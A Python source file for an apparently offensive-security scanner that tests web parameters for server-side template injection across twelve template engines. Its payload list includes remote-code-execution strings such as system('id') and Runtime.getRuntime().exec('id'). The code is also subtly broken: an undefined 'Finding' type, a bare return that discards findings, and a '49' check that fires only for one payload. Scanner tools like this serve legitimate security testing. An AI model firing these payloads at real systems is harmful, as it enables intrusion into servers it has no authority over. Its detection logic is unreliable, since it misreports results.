"""Server-Side Template Injection (SSTI) Scanner"""
import logging
import asyncio
from scanners.base_scanner import BaseScanner

log = logging.getLogger("xone.scanners.ssti")


class SSTIScanner(BaseScanner):
    """SSTI vulnerability scanner"""

    @property
    def name(self) -> str:
        return "ssti_scanner"

    @property
    def description(self) -> str:
        return "SSTI: 12 template engines, RCE via gadget chains"

    # Payloads for different template engines
    PAYLOADS = {
        "Jinja2": ["{{7*7}}", "{{7*'7'}}", "{{config}}"],
        "Twig": ["{{7*7}}", "{{_self.env}}"],
        "Ruby": ["<%= 7*7 %>", "<%= system('id') %>"],
        "Velocity": ["#set($x=7*7)$x", "#set($cmd='id')"],
        "FreeMarker": ["<#assign x=7*7>${x}", "${7*7}"],
        "Groovy": ["${7*7}", "${Runtime.getRuntime().exec('id')}"],
        "ERB": ["<%= 7*7 %>", "<% system('id') %>"],
        "Handlebars": ["{{7*7}}", "{{this}}"],
        "Expression": ["#{7*7}", "%{7*7}"],
        "Jexl": ["${7*7}", "${Runtime.getRuntime().exec('id')}"],
        "MVEL": ["7*7", "java.lang.Runtime.getRuntime().exec('id')"],
        "Razor": ["@{7*7}", "@Html.Raw()"],
    }

    async def scan(self, url: str, param: str) -> list[Finding]:
        """Scan for SSTI vulnerabilities"""
        self.findings = []

        log.info(f"[SSTI] Scanning: {url}?{param}=TEMPLATE")

        # Test each template engine
        for engine, payloads in self.PAYLOADS.items():
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = await self.client.get(test_url, allow_redirects=True, timeout=5)

                    # Check for successful template execution
                    if "49" in response.text and "{{7*7}}" in payload:
                        # Math executed!
                        self.create_finding(
                            vuln_type=f"SSTI: {engine}",
                            url=url,
                            payload=payload,
                            severity="Critical",
                            param=param,
                            context=f"Server-Side Template Injection in {engine} template engine",
                            cvss_score=9.8,
                            cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        )
                        log.info(f"[SSTI] {engine} found with payload: {payload}")
                        return

                except asyncio.TimeoutError:
                    log.debug(f"[SSTI] Timeout testing {engine}")
                except Exception as e:
                    log.debug(f"[SSTI] Error testing {engine}: {e}")

        return self.findings
